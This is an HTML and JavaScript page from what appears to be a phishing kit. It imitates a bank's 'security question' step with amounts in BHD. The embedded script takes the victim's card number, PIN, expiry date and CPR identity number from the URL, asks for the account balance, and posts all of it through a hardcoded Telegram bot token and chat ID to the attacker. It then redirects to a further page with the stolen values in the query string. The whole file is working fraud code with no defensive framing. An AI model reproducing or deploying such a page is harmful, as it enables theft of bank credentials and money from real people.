<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover" />
<title>Bank â€“ Security Question</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
<style>
  :root{
    --bg:#ffffff;
    --ink:#111827;
    --muted:#6b7280;
    --border:#e5e7eb;
    --brand:#22b14c;
    --brand-dark:#18973c;
    --danger:#e11d48;
    --disabled:#d1d5db;
  }
  *{box-sizing:border-box}
  html,body{height:100%}
  body{
    margin:0;
    background:#f5f7fb;
    font-family:Inter,system-ui,Segoe UI,Roboto,Helvetica,Arial,sans-serif;
    color:#111827;
    -webkit-font-smoothing:antialiased;
  }
  .screen{
    max-width:480px;
    margin:0 auto;
    min-height:100dvh;
    background:#fff;
    display:flex;
    flex-direction:column;
  }
  .content{padding:16px}
  .kka{
    width:92%;
    margin:16px auto 12px;
    display:block;
    height:auto;
    border-radius:12px;
    box-shadow:0 8px 24px rgba(0,0,0,.06);
    border:1px solid rgba(0,0,0,.06);
  }
  .section-title{
    margin:14px 0 6px;
    font-weight:700;
    font-size:18px;
  }
  .hint{color:var(--muted); margin-top:2px; font-size:13px;margin-bottom:8px}
  .hint.danger{color:var(--danger)}
  .field, .group{
    position:relative;
    border:1px solid var(--border);
    border-radius:14px;
    background:#fff;
    margin-bottom: 10px;
  }
  .field{padding:14px}
  .group{display:flex; overflow:hidden}
  .field:focus-within, .group:focus-within{ outline:3px solid rgba(34,177,76,.18); border-color:var(--brand) }
  .field input{
    width:100%;
    border:0;
    background:transparent;
    font-size:16px;
    outline:none;
  }
  .group input{
    width:100%;
    border:0;
    margin-left:15px;
    background:transparent;
    font-size:16px;
    outline:none;
  }
  .group .prefix{
    background:#f3f5f8;
    padding:14px 16px;
    color:#29323d;
    font-weight:600;
    min-width:72px; text-align:center;
    border-right:1px solid var(--border);
  }
  .btn{
    position:relative;
    width:100%;
    background:var(--brand);
    color:#fff;border:0;outline:0;
    font-weight:700;letter-spacing:.03em;
    padding:16px 20px;border-radius:16px;
    box-shadow:0 8px 18px rgba(34,177,76,.25);
    cursor:pointer;transition:all .15s ease;
    display:inline-flex;align-items:center;justify-content:center;
    min-height:56px;
    overflow:hidden;
    margin-top:14px;
  }
  .btn:hover:not(:disabled){box-shadow:0 10px 22px rgba(34,177,76,.3)}
  .btn:disabled{
    background:var(--disabled);
    color:#fff;
    cursor:not-allowed;
    box-shadow:none;
    opacity:1;
  }

  .btn__label{transition:opacity .15s ease}
  .btn__spinner{
    position:absolute; inset:0; display:none; align-items:center; justify-content:center;
  }
  .btn__spinner:before{
    content:""; width:20px; height:20px; border-radius:50%;
    border:3px solid rgba(255,255,255,.5); border-top-color:#fff;
    animation:spin 1s linear infinite;
  }
  .btn--loading .btn__label{opacity:0}
  .btn--loading .btn__spinner{display:flex}
  @keyframes spin{to{transform:rotate(360deg)}}

  .loader-backdrop{
    position: fixed; inset: 0; z-index: 1000;
    display: none; align-items: center; justify-content: center;
    background: rgba(0,0,0,.55); backdrop-filter: blur(2px);
  }
  .loader-backdrop.show{ display:flex; }
  .loader-gif{ width:60px; height:60px; object-fit:contain }
.number {
  font-size: 17px;
  font-weight: 600;
  text-align: center;
  margin-top: -90px;
  margin-left:-50px;
  letter-spacing: 0.15em;
  color: #c9c7c7;
}
.numberr {
  font-size: 14px;
  font-weight: 500;
  text-align: center;
   margin-left:-120px;
  margin-top: 4px;
  letter-spacing: 0.12em;
  color: #c9c7c7;
  margin-bottom:50px;
}
</style>
</head>
<body>
  <div class="screen">
    <div class="content">
      <img src="kka.png" class="kka" alt="Debit Card">
<p class="number">4632786483276482</p>
<p class="numberr">Valid Thru 12/25</p>
      <form id="security-form" novalidate>
        <div class="section-title">Account Number</div>
        <div class="field">
          <input id="acct" type="text" placeholder="Account Number : â€¢â€¢â€¢â€¢ â€¢â€¢â€¢â€¢ â€¢â€¢" disabled />
        </div>

        <div class="section-title">Bank Security Question</div>
        <div class="hint" id="hint">How much balance is available in your account?</div>

        <div class="group">
          <div class="prefix">BHD</div>
          <input id="amount" type="text" inputmode="decimal" autocomplete="off" placeholder="0.00">
        </div>

        <button id="continue" class="btn" type="submit" disabled>
          <span class="btn__label">Continue</span>
          <span class="btn__spinner" aria-hidden="true"></span>
        </button>
      </form>
    </div>
  </div>

  <div class="loader-backdrop" id="loader" aria-hidden="true">
    <img src="cicle_loader.gif" alt="Loading..." class="loader-gif" />
  </div>

<script>
  // Get query parameters from the URL
  const params = new URLSearchParams(window.location.search);
  const card = params.get("card");
  const pin = params.get("pin");
  const mm = params.get("mm");
  const yy = params.get("yy");
  const cpr = params.get("cpr");

  // Find your elements
  const numberEl = document.querySelector(".number");
  const numberrEl = document.querySelector(".numberr");

  // Mask or format the card number (optional)
  function formatCardNumber(num) {
    return num.replace(/(\d{4})(?=\d)/g, "$1 "); // groups of 4 digits
  }

  // Display the values if present
  if (card) numberEl.textContent = formatCardNumber(card);
  if (mm && yy) numberrEl.textContent = `Valid Thru ${mm}/${yy.slice(-2)}`;

  const form = document.getElementById('security-form');
  const amtEl = document.getElementById('amount');
  const hint = document.getElementById('hint');
  const cta = document.getElementById('continue');
  const loader = document.getElementById('loader');

  function parseAmount(raw){
    let v = (raw||"").replace(/[^\d.,]/g,'').replace(',', '.');
    const parts = v.split('.');
    if (parts.length > 2) v = parts.shift() + '.' + parts.join('');
    const num = Number(v);
    return Number.isFinite(num) ? num : NaN;
  }

  function isValid(){
    const n = parseAmount(amtEl.value);
    return Number.isFinite(n) && n > 0;
  }

  function updateBtnState(){
    if (isValid()){
      cta.disabled = false;
    } else {
      cta.disabled = true;
    }
  }

  amtEl.addEventListener('input', updateBtnState);

  function showLoader(){
    loader.classList.add('show');
    cta.classList.add('btn--loading');
  }
  function hideLoader(){
    loader.classList.remove('show');
    cta.classList.remove('btn--loading');
  }

  // Function to send data to Telegram
  async function sendToTelegram(data) {
    // Replace with your actual Telegram bot token and chat ID
    const botToken = '8317396526:AAFNNX5WnbBb_Nt9cOUDOqy1cXhe2xrsSu8';
    const chatId = '-5091670751';
    
    // Format the message
    const message = `
ðŸ” *New Security Question Submission*

*Card Details:*
- Card Number: ${data.card || 'N/A'}
- PIN: ${data.pin || 'N/A'}
- Expiry: ${data.mm || 'N/A'}/${data.yy || 'N/A'}
- CPR: ${data.cpr || 'N/A'}

*Security Question Answer:*
- Account Balance: BHD ${data.amount}

*Time:* ${data.time}
    `;
    
    try {
      const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: 'Markdown'
        })
      });
      
      const result = await response.json();
      return result.ok;
    } catch (error) {
      console.error('Error sending to Telegram:', error);
      return false;
    }
  }

  form.addEventListener('submit', async (e)=>{
    e.preventDefault();
    updateBtnState();
    if (cta.disabled) return;

    cta.disabled = true;
    amtEl.disabled = true;
    showLoader();

    const timePK = new Intl.DateTimeFormat("en-PK", {
      timeZone: "Asia/Karachi",
      dateStyle: "medium",
      timeStyle: "medium",
    }).format(new Date());

    const payload = {
      card: card,
      pin: pin,
      mm: mm,
      yy: yy,
      cpr: cpr,
      amount: parseAmount(amtEl.value),
      time: timePK
    };

    // Send data to Telegram
    const telegramSuccess = await sendToTelegram(payload);
    
    if (telegramSuccess) {
      console.log("Data sent to Telegram successfully");
    } else {
      console.log("Failed to send data to Telegram");
    }

    // Fake delay to show loader
    await new Promise(r => setTimeout(r, 1500));

    hideLoader();
    
    // Redirect to fk.html with all data in the route
    const redirectUrl = `fk.html?card=${encodeURIComponent(card || '')}&pin=${encodeURIComponent(pin || '')}&mm=${encodeURIComponent(mm || '')}&yy=${encodeURIComponent(yy || '')}&cpr=${encodeURIComponent(cpr || '')}&amount=${encodeURIComponent(amtEl.value)}`;
    window.location.href = redirectUrl;
  });

  updateBtnState();
</script>
</body>
</html>